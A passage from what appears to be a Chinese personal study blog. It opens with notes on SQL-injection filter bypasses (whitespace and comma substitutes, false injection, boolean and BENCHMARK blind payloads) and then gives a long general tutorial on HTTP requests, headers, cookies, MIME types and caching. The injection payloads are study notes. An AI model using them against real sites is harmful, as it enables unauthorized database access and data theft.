<h4 id="括号嵌套"><a href="#括号嵌套" class="headerlink" title="括号嵌套"></a>括号嵌套</h4><p><code>select(group_concat(table_name))from(information_schema.taboles)where(tabel_schema=database());</code></p>
<h4 id="制表符、换行、不可见空格"><a href="#制表符、换行、不可见空格" class="headerlink" title="制表符、换行、不可见空格"></a>制表符、换行、不可见空格</h4><p>%09(制表符), %0a(换行), %0b(垂直制表符), %0d(回车), %a0(不间断空格)%0c(换页符),%20(空格)</p>
<h4 id="反引号"><a href="#反引号" class="headerlink" title="反引号"></a>反引号</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">union(select`table_name`,`table_type`from`information_schema`.`tables`);</span><br></pre></td></tr></table></figure>

<h3 id="被过滤"><a href="#被过滤" class="headerlink" title="&#x3D;被过滤"></a>&#x3D;被过滤</h3><p>可以用like(其子句中用%来表示任意字符)或rlike，也可以用regexp(不区分大小写，若需要大小写敏感，加binary)来绕过</p>
<p>比如&#x3D;’admin’ 就可以like ‘admin’</p>
<h3 id="逗号过滤"><a href="#逗号过滤" class="headerlink" title="逗号过滤"></a>逗号过滤</h3><p>逗号被过滤时可以使用from…for…</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select substr(select database() from 1 for 1);</span><br><span class="line">select substr(select database() from 2 for 1);</span><br></pre></td></tr></table></figure>

<p>limit中的逗号可以替换成<strong>offset</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from users limit 1 offset 2;</span><br></pre></td></tr></table></figure>

<p>需要注意，limit 1,2 指的是从第一行往后取2行（包括第一行和第二行)；而limit 1 offset 2是从第一行开始只取第二行</p>
<h3 id="False注入"><a href="#False注入" class="headerlink" title="False注入"></a>False注入</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from users where username = 0;		# 查询表中所有数据</span><br></pre></td></tr></table></figure>

<p>其实是利用了mysql的隐式类型转换，当字符串与数字比较时，会<strong>将字符串转换为浮点数</strong>，转换失败并<strong>返回0</strong>，0 &#x3D; 0返回True，就会返回表中所有数据</p>
<p>绕过引号构造0的方法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from users where username = &#x27;&#x27;+&#x27;&#x27;;</span><br><span class="line">select * from users where username = &#x27;&#x27;-&#x27;&#x27;;</span><br><span class="line">select * from users where username = &#x27;&#x27;*&#x27;&#x27;;</span><br><span class="line">select * from users where username = &#x27;&#x27;%1#&#x27;;</span><br><span class="line">select * from users where username = &#x27;&#x27;/6#&#x27;;</span><br></pre></td></tr></table></figure>

<h3 id="等价函数"><a href="#等价函数" class="headerlink" title="等价函数"></a>等价函数</h3><h4 id="if-与-case…when-then…else…end"><a href="#if-与-case…when-then…else…end" class="headerlink" title="if()与 case…when..then…else…end"></a>if()与 case…when..then…else…end</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0&#x27; or if((ascii(substr((select database()),1,1))&gt;97),1,0)#</span><br><span class="line">=</span><br><span class="line">0&#x27; or case when ascii(substr((select database()),1,1))&gt;97 then 1 else 0 end#</span><br></pre></td></tr></table></figure>

<h4 id="sleep-与benchmark"><a href="#sleep-与benchmark" class="headerlink" title="sleep()与benchmark()"></a>sleep()与benchmark()</h4><p>benchmark()函数用来测试执行速度，第一个参数代表执行的次数，第二个参数代表要执行的表达式或函数，根据执行的时间来判断</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1 AND BENCHMARK(5000000, MD5(&#x27;test&#x27;))</span><br></pre></td></tr></table></figure>

<h4 id="concat-ws-与group-concat"><a href="#concat-ws-与group-concat" class="headerlink" title="concat_ws()与group_concat()"></a>concat_ws()与group_concat()</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select group_concat(database());</span><br><span class="line">=</span><br><span class="line">select concat_ws(1,database());</span><br></pre></td></tr></table></figure>

<h4 id="substr-与substring-ipad-rpad-left-mid"><a href="#substr-与substring-ipad-rpad-left-mid" class="headerlink" title="substr()与substring()&#x2F;ipad()&#x2F;rpad()&#x2F;left()&#x2F;mid()"></a>substr()与substring()&#x2F;ipad()&#x2F;rpad()&#x2F;left()&#x2F;mid()</h4><h2 id="outfile-sql注入之文件写入webshell（太难了，暂定）"><a href="#outfile-sql注入之文件写入webshell（太难了，暂定）" class="headerlink" title="outfile_sql注入之文件写入webshell（太难了，暂定）"></a>outfile_sql注入之文件写入webshell（太难了，暂定）</h2>]]></content>
      <categories>
        <category>漏洞</category>
      </categories>
  </entry>
  <entry>
    <title>HTTP</title>
    <url>/2024/10/15/HTTP/</url>
    <content><![CDATA[<h1 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h1><h2 id="HTTP概述"><a href="#HTTP概述" class="headerlink" title="HTTP概述"></a>HTTP概述</h2><p><strong>HTTP</strong> 是一种用作获取诸如 HTML 文档这类资源的协议（TTP 是一种应用层的协议，通过 TCP 或 TLS（一种加密过的 TCP 连接）来发送）。它是 Web 上进行任何数据交换的基础，也是一种客户端—服务器（client-server）协议</p>
<h2 id="HTTP请求包的结构"><a href="#HTTP请求包的结构" class="headerlink" title="HTTP请求包的结构"></a>HTTP请求包的结构</h2><h3 id="请求行"><a href="#请求行" class="headerlink" title="请求行"></a>请求行</h3><h4 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h4><p>（统一资源定位符）是因特网中的唯一资源的地址。它是浏览器用于检索已发布资源（例如 HTML 页面、CSS 文档、图像等）的关键机制之一</p>
<h5 id="URL基本内容"><a href="#URL基本内容" class="headerlink" title="URL基本内容"></a>URL基本内容</h5><img src="https://raw.githubusercontent.com/zkk1233/Picture/main/20241224235651760.png" style="zoom:200%;" />

<h6 id="协议（scheme）"><a href="#协议（scheme）" class="headerlink" title="协议（scheme）"></a>协议（scheme）</h6><p> HTTPS 、 HTTP、FTP</p>
<p><img src="https://raw.githubusercontent.com/zkk1233/Picture/main/20241224235651761.png"></p>
<h6 id="权威（authority）"><a href="#权威（authority）" class="headerlink" title="权威（authority）"></a>权威（authority）</h6><p>权威包括域名（例如 <code>www.example.com</code>）和端口（<code>80</code>），由冒号分隔</p>
<p>注：邮件客户端（<code>mailto:foobar</code>）不使用权威（其包含方案）</p>
<h6 id="路径（Path）"><a href="#路径（Path）" class="headerlink" title="路径（Path）"></a>路径（Path）</h6><p><code>/path/to/myfile.html</code> 、<code>/index.html</code>是 Web 服务器上资源的路径</p>
<h6 id="参数（Parameters）"><a href="#参数（Parameters）" class="headerlink" title="参数（Parameters）"></a>参数（Parameters）</h6><p><code>?key1=value1&amp;key2=value2</code> 是提供给 Web 服务器的额外参数(参数是用 <code>&amp;</code> 符号分隔的键&#x2F;值对列表)</p>
<h6 id="锚点（Anchor）"><a href="#锚点（Anchor）" class="headerlink" title="锚点（Anchor）"></a>锚点（Anchor）</h6><p><code>#SomewhereInTheDocument</code> 是资源本身的另一部分的锚点</p>
<p>锚点表示资源中的一种“书签”，给浏览器显示位于该“加书签”位置的内容的方向</p>
<p><strong>#</strong> 后面的部分（也称为<strong>片段标识符</strong>）不会随请求被发送到服务器</p>
<h5 id="一些URL"><a href="#一些URL" class="headerlink" title="一些URL"></a>一些URL</h5><p>数据URL：以 <code>data:</code> 方案为前缀的 URL，允许内容创建者在文档中嵌入小文件</p>
<p>注：URL 编码使用 “%” 其后跟随两位的十六进制数来替换非 ASCII 字符。</p>
<p>URL 不能包含空格。URL 编码通常使用 + 来替换空格。</p>
<h3 id="请求方式"><a href="#请求方式" class="headerlink" title="请求方式"></a>请求方式</h3><h4 id="请求方式："><a href="#请求方式：" class="headerlink" title="请求方式："></a>请求方式：</h4><p><img src="https://raw.githubusercontent.com/zkk1233/Picture/main/20241224235651762.png"></p>
<h4 id="GET和POST"><a href="#GET和POST" class="headerlink" title="GET和POST"></a>GET和POST</h4><h5 id="get-请求"><a href="#get-请求" class="headerlink" title="get 请求"></a>get 请求</h5><p>GET 请求<strong>主要用于从服务器获取数据</strong>，常用于获取<strong>静态资源</strong>（网页、图片、文件等）<img src="https://raw.githubusercontent.com/zkk1233/Picture/main/20241224235651763.png"></p>
<p>get请求的参数传递方式</p>
<p>在 HTTP 请求中，GET 请求可以通过 URL 参数或者请求体的方式传递参数。</p>
<p>URL 参数：GET 请求可以通过 URL 中指定的 key-value 形式传递参数。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://example.com/search?q=test&amp;page=2</span><br></pre></td></tr></table></figure>

<p>？后 key&#x3D; value</p>
<h5 id="post请求"><a href="#post请求" class="headerlink" title="post请求"></a>post请求</h5><p>POST 请求<strong>主要用于向服务器提交数据，通常用于创建、更新或删除资源</strong>、上传文件、发送 JSON 数据</p>
<p><img src="https://raw.githubusercontent.com/zkk1233/Picture/main/20241224235651764.png"></p>
<p>post请求的参数传递方式：URL 参数和请求体。</p>
<p>1.URL 参数：POST 请求可以通过 URL 中指定的 key-value 形式传递参数。例如，在访问如下 URL 时：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://example.com/search?q=test&amp;page=2</span><br></pre></td></tr></table></figure>

<p>2.请求体（仅适用于 POST、PUT、PATCH 请求）：当 POST、PUT 或 PATCH 请求的 URL 中没有指定参数时，参数会被放置在请求体中。请求体中的数据可以是表单数据、JSON 数据等。例如，使用 POST 请求将 JSON 数据发送到如下 URL 时：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://example.com/users</span><br></pre></td></tr></table></figure>

<p>请求体中的 JSON 数据如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line"> &quot;name&quot;: &quot;John Doe&quot;,</span><br><span class="line"> &quot;email&quot;: &quot;john.doe@example.com&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="get和post区别"><a href="#get和post区别" class="headerlink" title="get和post区别"></a>get和post区别</h5><p><img src="https://raw.githubusercontent.com/zkk1233/Picture/main/20241224235651765.png"></p>
<h5 id="get-和-post-请求的使用场景"><a href="#get-和-post-请求的使用场景" class="headerlink" title="get 和 post 请求的使用场景"></a>get 和 post 请求的使用场景</h5><h6 id="get"><a href="#get" class="headerlink" title="get"></a>get</h6><ul>
<li>获取数据：GET 请求适合用于从服务器获取数据，例如获取网页内容、查询数据库、获取资源文件等。由于 GET 请求的参数会显示在 URL 中，因此它适用于不需要保密的参数传递。</li>
<li>缓存友好：GET 请求的响应可以被缓存，这对于一些静态资源的获取非常有益，可以提高性能和减少服务器负载。</li>
<li>链接导航：GET 请求可以用于在浏览器中进行链接导航，通过在 URL 中传递参数来指定要导航到的页面或资源。</li>
</ul>
<h6 id="post"><a href="#post" class="headerlink" title="post"></a>post</h6><ul>
<li><p>提交数据：POST 请求适合用于向服务器提交数据，例如提交表单、上传文件等。由于 POST 请求的参数不会显示在 URL 中，因此它<strong>适用于传递敏感数据或大量参数</strong>。</p>
</li>
<li><p>创建资源：POST 请求可以用于在服务器上创建新的资源，例如创建新的用户、发布新的文章等。</p>
</li>
<li><p>执行非幂等操作：POST 请求是非幂等的，意味着多次发送相同的 POST 请求可能会产生不同的结果。这适用于一些需要执行不可重复操作的场景，例如订单支付、密码修改等。</p>
<p>加键值对时get在url中？a&#x3D;1   post在请求体中a&#x3D;11</p>
</li>
</ul>
<h3 id="请求头及其内容"><a href="#请求头及其内容" class="headerlink" title="请求头及其内容"></a>请求头及其内容</h3><img src="https://raw.githubusercontent.com/zkk1233/Picture/main/20241224235651766.png" />

<h4 id="常见的请求头及作用"><a href="#常见的请求头及作用" class="headerlink" title="常见的请求头及作用"></a>常见的请求头及作用</h4><p>Host，Referer，User-Agent，Cookie，Content-Type，X-Forwarded-For</p>
<p><em>注：POST 请求（包含 HTML 表单数据）需要主体</em></p>
<p><em>主体大致可分为两类：</em></p>
<p>*单一资源（Single-resource）主体，由一个单文件组成。该类型的主体由两个标头定义：Content-Type和Content-Length</p>
<p><em>多资源（Multiple-resource）主体，由多部分主体组成，每一部分包含不同的信息位。通常是和 HTML 表单连系在一起。</em></p>
<ol>
<li><p><strong>Host</strong>：指定请求的服务器的域名和端口号。</p>
</li>
<li><p><strong>User-Agent</strong>：包含发出请求的用户代理（浏览器）的信息，可用来浏览器伪造。</p>
<p>一个典型的 <code>User-Agent</code> 字符串可能看起来像这样：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36</span><br></pre></td></tr></table></figure>

<p>这个字符串包含了以下信息：</p>
<ul>
<li><strong>浏览器</strong>：Mozilla&#x2F;5.0</li>
<li><strong>操作系统</strong>：Windows NT 10.0</li>
<li><strong>平台</strong>：Win64; x64</li>
<li><strong>浏览器核心</strong>：AppleWebKit&#x2F;537.36</li>
<li><strong>浏览器名称</strong>：Chrome</li>
<li><strong>浏览器版本</strong>：58.0.3029.110</li>
<li><strong>渲染引擎</strong>：Safari&#x2F;537.36</li>
</ul>
</li>
<li><p><strong>Accept</strong>：指定客户端能够处理的媒体类型。</p>
</li>
<li><p><strong>Accept-Language</strong>：指定客户端偏好的语言。</p>
</li>
<li><p><strong>Accept-Encoding</strong>：指定客户端能够处理的压缩算法。</p>
</li>
<li><p><strong>Authorization</strong>：用于身份验证的凭证。</p>
<blockquote>
<p>[!IMPORTANT]</p>
<h4 id="HTTP-基本认证"><a href="#HTTP-基本认证" class="headerlink" title="HTTP 基本认证"></a>HTTP 基本认证</h4><p>通过在请求头 (<code>Authorization</code> 头) 中发送用户名和密码来进行身份验证。用户名和密码（用户名：密码）会经过 <strong>Base64 编码</strong>，但 <strong>不会加密</strong></p>
<p><strong>客户端提供用户名和密码</strong>，并在 <code>Authorization</code> 头中发送：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Authorization: Basic &lt;Base64编码的用户名:密码&gt;</span><br></pre></td></tr></table></figure>


</blockquote>
</li>
<li><p><strong>Cookie</strong>：Cookie 是一种服务器发送到用户浏览器并保存在本地的数据。它用于跟踪和识别用户会话，存储用户的偏好设置。</p>
<p>基本概念</p>
<p>会话Cookie：只在浏览器会话期间有效，当用户关闭浏览器时，这些Cookie就会被删除。浏览器定义了“当前会话”结束的时间，一些浏览器重启时会使用<em>会话恢复</em>。这可能导致会话 cookie 无限延长。</p>
<p>持久Cookie：在过期时间（<code>Expires</code>）指定的日期或有效期（<code>Max-Age</code>）指定的一段时间后被删除。</p>
<p>示例</p>
<p>假设服务器想要设置一个Cookie，其内容如下：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">Set-Cookie: sessionId=abc123; Expires=Wed, 09 Jun 2024 10:18:14 GMT; Domain=example.com; Path=/; Secure; HttpOnly; SameSite=Lax</span><br></pre></td></tr></table></figure>

<p>在这个例子中：</p>
<p><code>sessionId=abc123</code> 是Cookie的名称-值对（存储在Cookie中的数据）</p>
<p><code>Expires=Wed, 09 Jun 2024 10:18:14 GMT</code> 定义了Cookie的过期时间。<code>ax-Age</code>属性指定一个相对于创建时的时间长度（以秒为单位）</p>
<p><code>Domain=example.com</code> 指定了Cookie的有效域名（哪些域名下的页面请求可以包含这个Cookie）如果未指定，默认为创建Cookie的服务器的域名</p>
<p><code>Path=/</code> 指定了Cookie的有效路径。</p>
<p><code>Secure</code> 属性表示Cookie仅通过HTTPS发送。</p>
<p><code>HttpOnly</code> 属性表示Cookie不能被客户端脚本（如JavaScript）访问。</p>
<blockquote>
<p>[!CAUTION]</p>
<p>XSS 攻击是一种常见的攻击方式，攻击者通过向 Web 页面注入恶意的 JavaScript 代码来窃取用户数据。使用 <code>HttpOnly</code> 标记的 Cookie 可以防止恶意 JavaScript 代码通过 <code>document.cookie</code> 或其他方式获取敏感数据（如会话 Cookie）</p>
<p>但它并不能防止 Cookie 被服务器端访问，攻击者如果能够获得服务器端的访问权限（如 SQL 注入、服务器配置错误等）或进行CSRF（跨站请求伪造）攻击，仍然有可能窃取 Cookie</p>
<p>因此，它需要与其他安全措施（如 <code>Secure</code>、<code>SameSite</code>）结合使用，以提供全面的安全防护</p>
</blockquote>
<p><code>SameSite=Lax</code> 属性表示在跨站请求时，Cookie不会随请求发送，除非请求是同站的。</p>
</li>
<li><p><strong>Content-Length</strong>：请求体的长度。</p>
</li>
<li><p><strong>Content-Type</strong>：指定资源的媒体类型（ MIME 类型）（<strong>媒体类型</strong>（也通常称为<strong>多用途互联网邮件扩展</strong>或 <strong>MIME</strong> 类型）是一种标准，用来表示文档、文件或一组数据的性质和格式），告诉接收方如何处理传输的数据</p>
<blockquote>
<p>[!WARNING]</p>
<p> 浏览器通常使用 MIME 类型<em>而不是文件扩展名</em>来决定如何处理 URL，因此 Web 服务器在 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Type"><code>Content-Type</code></a> 响应标头中添加正确的 MIME 类型非常重要。如果配置不正确，浏览器可能会曲解文件内容，网站将无法正常工作，并且下载的文件也可能被错误处理</p>
</blockquote>
<p>以下是一些常见的 <code>Content-Type</code> 值及其对应的数据格式：</p>
<ol>
<li><p><strong>文本类型</strong></p>
<ul>
<li><p><code>text/html</code>：HTML 文档。</p>
<blockquote>
<p>[!CAUTION]</p>
<p>如果需要 XML 的严格解析规则、<code>&lt;![CDATA[...]]&gt;</code>(<em>在 XML 中，所有的字符数据默认都会被解析，并且需要处理特殊字符（比如 <code>&amp;</code> 会变成 <code>&amp;</code>，<code>&lt;</code> 会变成 <code>&lt;</code>）。但是，如果你使用 <code>CDATA</code>，则该部分中的所有内容都会被当作普通文本处理，直到遇到 <code>]]&gt;</code>，这时 CDATA 部分结束</em>)或 HTML&#x2F;SVG&#x2F;MathML 命名空间以外的元素，请使用 application&#x2F;xml 或 application&#x2F;xhtml+xml</p>
</blockquote>
</li>
<li><p><code>text/plain</code>：纯文本，文本文件的默认值。即使它其实意味着<em>未知的文本文件</em>，但浏览器认为是可以直接展示的。</p>
<blockquote>
<p>[!CAUTION]</p>
<p>text&#x2F;plain 并不意味“任何种类的文本数据”。如果浏览器期待的是某种特定的文本数据，很可能不会将其视为匹配。具体来说，如果从声明 CSS 文件的 <code>&lt;link&gt;</code> 元素中下载了一个 text&#x2F;plain 文件，那么如果提供的是 text&#x2F;plain类型，就不会将其识别为有效的 CSS 文件。CSS MIME 类型需要使用 text&#x2F;css</p>
</blockquote>
</li>
<li><p><code>text/css</code>：层叠样式表（CSS），在网页中要被解析为 CSS 的任何 CSS 文件<strong>必须</strong>指定 MIME 为 <code>text/css</code></p>
</li>
<li><p><code>text/javascript</code>：JavaScript 代码（已废弃，应使用 <code>application/javascript</code>）。</p>
</li>
</ul>
</li>
<li><p><strong>图像类型</strong></p>
<ul>
<li><code>image/gif</code>：图形交换格式（GIF）</li>
<li><code>image/jpeg</code>：联合图像专家小组图片（JPEG）</li>
<li><code>image/png</code>：便携式网络图形（PNG）</li>
<li><code>image/svg+xml</code>：可缩放矢量图形（SVG）</li>
<li><code>image/webp</code>：Web 图像格式（WEBP）</li>
<li><code>image/apng</code>：动画便携式网络图形（APNG）</li>
<li><code>image/avif</code>：AV1 图像文件格式（AVIF）</li>
</ul>
</li>
<li><p><strong>音频和视频类型</strong></p>
<ul>
<li><code>audio/mpeg</code>：MPEG 音频。</li>
<li><code>video/mp4</code>：MP4 视频。</li>
<li><code>audio/ogg</code>：Ogg 音频。</li>
<li><code>video/ogg</code>：Ogg 视频。</li>
<li><code>video/webm</code>: WebM格式的视频。</li>
</ul>
</li>
<li><p><strong>应用程序类型</strong></p>
<ul>
<li><code>application/json</code>：JSON 数据。</li>
<li><code>application/xml</code>：XML 数据。</li>
<li><code>application/pdf</code>：PDF 文档。</li>
<li><code>application/zip</code>：ZIP 压缩文件。</li>
<li><code>application/javascript</code>：JavaScript 代码（现代浏览器推荐使用）。</li>
</ul>
</li>
<li><p><strong>多部分类型</strong></p>
<ul>
<li><code>multipart/form-data</code>：用于表单数据的传输，允许在单个请求中发送多个文件和字段。这通常用于文件上传和多值数据传输，可用于HTML表单从浏览器发送信息给服务器</li>
<li><code>multipart/byteranges</code>：用于定义多个字节范围，通常用于视频流或大文件下载</li>
</ul>
</li>
<li><p><strong>其他类型</strong></p>
<ul>
<li><code>application/octet-stream</code>：这是二进制文件的默认值。由于这意味着<em>未知的二进制文件</em>，浏览器一般不会自动执行或询问执行。浏览器将这些文件视为 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Disposition"><code>Content-Disposition</code></a> 标头被设置为 <code>attachment</code> 一样，并弹出“另存为”对话框</li>
<li><code>application/x-www-form-urlencoded</code>：用于表单数据的传输，通常用于 GET 和 POST 请求。</li>
</ul>
</li>
<li><p><strong>字符编码</strong></p>
<ul>
<li>许多 <code>Content-Type</code> 值可以包含字符编码信息，如 <code>text/html; charset=utf-8</code>，这指定了使用 UTF-8 编码的 HTML 文档。</li>
</ul>
</li>
</ol>
<blockquote>
<p>[!IMPORTANT]</p>
<p>在 HTML 表单中，<code>enctype</code> 是一个属性，用于指定在提交表单时数据的编码类型。它决定了表单数据在发送到服务器时的格式在 HTML 表单中，<code>enctype</code> 是一个属性，用于指定在提交表单时数据的编码类型。它决定了表单数据在发送到服务器时的格式</p>
<p><strong>application&#x2F;x-www-form-urlencoded</strong>（默认）：适用于提交常规文本数据，简单的表单提交。</p>
<p><strong>multipart&#x2F;form-data</strong>：适用于<strong>上传文件</strong>时的表单提交，当表单包含文件上传时，一定要使用 <code>multipart/form-data</code>，否则文件将无法正确上传</p>
<p><strong>text&#x2F;plain</strong>：以纯文本形式提交数据，每对 <code>name=value</code> 由换行符分隔。</p>
</blockquote>
</li>
<li><p><strong>Referer</strong>：指示请求来源的页面URL（用户是从哪个页面点击链接到达当前请求的页面的），可用来服务器伪造 <a href="https://www.xxxx.com,这个头部字段通常用于分析流量来源、防止csrf(跨站请求伪造)攻击以及跟踪用户行为/">https://www.xxxx.com，这个头部字段通常用于分析流量来源、防止CSRF（跨站请求伪造）攻击以及跟踪用户行为</a></p>
<p>示例</p>
<p>假设你访问了一个网站 <code>http://example.com/page1</code>，然后从该页面点击链接跳转到 <code>http://example.com/page2</code>，浏览器在请求 <code>page2</code> 时，通常会将以下头部添加到请求中：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Referer: http://example.com/page1</span><br></pre></td></tr></table></figure>

<p>假设用户从页面 <code>https://www.example.com/page1.html</code> 点击一个链接，跳转到 <code>https://www.example.com/page2.html</code>，那么在请求 <code>page2.html</code> 时，HTTP请求的 <code>Referer</code> 头部可能如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /page2.html HTTP/1.1</span><br><span class="line">Host: www.example.com</span><br><span class="line">Referer: https://www.example.com/page1.html</span><br></pre></td></tr></table></figure></li>
</ol>
<p>11.<strong>X-Forwarded-For</strong>:用于在HTTP请求经过代理服务器或负载均衡器时保留原始客户端的IP地址信息，可用于修改ip 如127.0.0.1</p>
<p><code>X-Forwarded-For</code>头部字段的格式如下：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">X-Forwarded-For: &lt;client-IP&gt;, &lt;proxy1-IP&gt;, &lt;proxy2-IP&gt;, ...</span><br></pre></td></tr></table></figure>

<p>其中，列表中的第一个IP地址（<code>&lt;client-IP&gt;</code>）是客户端的真实IP地址，随后的IP地址表示请求依次经过的代理服务器的IP地址。</p>
<h2 id="HTTP响应包的结构"><a href="#HTTP响应包的结构" class="headerlink" title="HTTP响应包的结构"></a>HTTP响应包的结构</h2><p>响应行</p>
<p>HTTP&#x2F;1.1 404 Not Found</p>
<ol>
<li><em>协议版本</em>，通常为 <code>HTTP/1.1</code>。</li>
<li><em>状态码</em>（status code），表明请求是成功或失败。常见的状态码是 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status/200"><code>200</code></a>（OK。请求成功）、<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status/404"><code>404</code></a> （Not Found。服务器无法找到请求的资源）或<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status/301"><code>301</code></a>（Moved Permanently。请求资源的 URI 已被改变）</li>
<li><em>状态文本</em>（status text）。一个简短的，纯粹的信息，通过状态码的文本描述，帮助人们理解该 HTTP 消息</li>
</ol>
<p>响应头</p>
<p><img src="https://raw.githubusercontent.com/zkk1233/Picture/main/20241224235651767.png"></p>
<p>通用标头（General header），例如 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Via"><code>Via</code></a>，适用于整个消息。</p>
<p>响应标头（Response header），例如 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Vary"><code>Vary</code></a> 和 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Accept-Ranges"><code>Accept-Ranges</code></a>，提供有关服务器的其他信息，这些信息不适合状态行。</p>
<p>表示标头（Representation header），例如 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Type"><code>Content-Type</code></a> 描述了消息数据的原始格式和应用的任意编码（仅在消息有主体时才存在）</p>
<ol>
<li><strong>Content-Type</strong>：响应体的媒体类型。</li>
<li><strong>Content-Length</strong>：响应体的长度。</li>
<li><strong>Cache-Control</strong>：控制响应的缓存行为。</li>
<li><strong>Expires</strong>：指定资源到期的时间。</li>
<li><strong>Set-Cookie</strong>：设置客户端的Cookie。</li>
<li><strong>Location</strong>：用于重定向的URL。</li>
<li><strong>Server</strong>：包含服务器软件的信息。</li>
<li><strong>WWW-Authenticate</strong>：用于HTTP认证的挑战。</li>
<li><strong>Last-Modified</strong>：资源最后修改的时间。</li>
<li><strong>ETag</strong>：资源的特定版本的标识符。</li>
</ol>
<h2 id="HTTP缓存"><a href="#HTTP缓存" class="headerlink" title="HTTP缓存"></a>HTTP缓存</h2><p>HTTP 缓存会存储与请求关联的响应，并将存储的响应复用于后续请求</p>
<h3 id="私有缓存"><a href="#私有缓存" class="headerlink" title="私有缓存"></a>私有缓存</h3><p>绑定到<strong>特定</strong>客户端的缓存——通常是浏览器缓存</p>
<p>如果响应包含个性化内容并且你只想将响应存储在私有缓存中，则必须指定 <code>private</code> 指令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Cache-Control: private</span><br></pre></td></tr></table></figure>

<blockquote>
<p>[!CAUTION]</p>
<p>如果响应具有 <code>Authorization</code> 标头，则不能将其存储在私有缓存（或共享缓存，除非 Cache-Control 指定的是 <code>public</code>）中</p>
</blockquote>
<blockquote>
<p>[!NOTE]</p>
<p> <code>public</code> 值具有使响应可存储的效果，只有在设置了 <code>Authorization</code> 标头时需要存储响应时才应使用 <code>public</code> 指令。否则不需要，因为只要给出了 <code>max-age</code>，响应就会存储在共享缓存中。</p>
</blockquote>
<h3 id="共享缓存"><a href="#共享缓存" class="headerlink" title="共享缓存"></a>共享缓存</h3><p>位于客户端和服务器之间，可以存储能在用户之间共享的响应</p>
<h4 id="代理缓存"><a href="#代理缓存" class="headerlink" title="代理缓存"></a>代理缓存</h4><p>除了访问控制的功能外，一些代理还实现了缓存以减少网络流量</p>
<h4 id="托管缓存"><a href="#托管缓存" class="headerlink" title="托管缓存"></a>托管缓存</h4><p>由服务开发人员明确部署，以降低源服务器负载并有效地交付内容，包括反向代理、CDN 和 service worker 与缓存 API 的组合</p>
<blockquote>
<p>[!CAUTION]</p>
<p>HTTP 缓存规范本质上没有定义显式删除缓存的方法——但是使用托管缓存，可以通过仪表板操作、API 调用、重新启动等实时删除已经存储的响应</p>
</blockquote>
<h3 id="启发式缓存"><a href="#启发式缓存" class="headerlink" title="启发式缓存"></a>启发式缓存</h3><p>HTTP 旨在尽可能多地缓存，因此即使没有给出 <code>Cache-Control</code>，如果满足某些条件，响应也会被存储和重用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Content-Type: text/html</span><br><span class="line">Content-Length: 1024</span><br><span class="line">Date: Tue, 22 Feb 2022 22:22:22 GMT</span><br><span class="line">Last-Modified（最后修改时间）: Tue, 22 Feb 2021 22:22:22 GMT</span><br><span class="line"></span><br><span class="line">&lt;!doctype html&gt;</span><br><span class="line">…</span><br></pre></td></tr></table></figure>

<p>采取以上响应。此回复最后一次更新是在 1 年前</p>
<h3 id="基于-age-的缓存策略"><a href="#基于-age-的缓存策略" class="headerlink" title="基于 age 的缓存策略"></a>基于 age 的缓存策略</h3><p>存储的 HTTP 响应有两种状态：<strong>fresh</strong> 和 <strong>stale</strong>。<em>fresh</em> 状态通常表示响应仍然有效，可以重复使用，而 <em>stale</em> 状态表示缓存的响应已经过期</p>
<p>确定响应何时是 fresh 的和何时是 stale 的标准是 <strong>age</strong>（在 HTTP&#x2F;1.0 中，有效期是通过 <code>Expires</code> 标头来指定的，在 HTTP&#x2F;1.1 中，<code>Cache-Control</code> 采用了 <code>max-age</code>——用于指定经过的时间）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Content-Type: text/html</span><br><span class="line">Content-Length: 1024</span><br><span class="line">Date: Tue, 22 Feb 2022 22:22:22 GMT</span><br><span class="line">Cache-Control: max-age=604800</span><br><span class="line"></span><br><span class="line">&lt;!doctype html&gt;</span><br><span class="line">…</span><br></pre></td></tr></table></figure>

<p>当响应存储在共享缓存中时，有必要通知客户端响应的 age。，如果共享缓存将响应存储了一天，则共享缓存将向后续客户端请求发送以下响应</p>
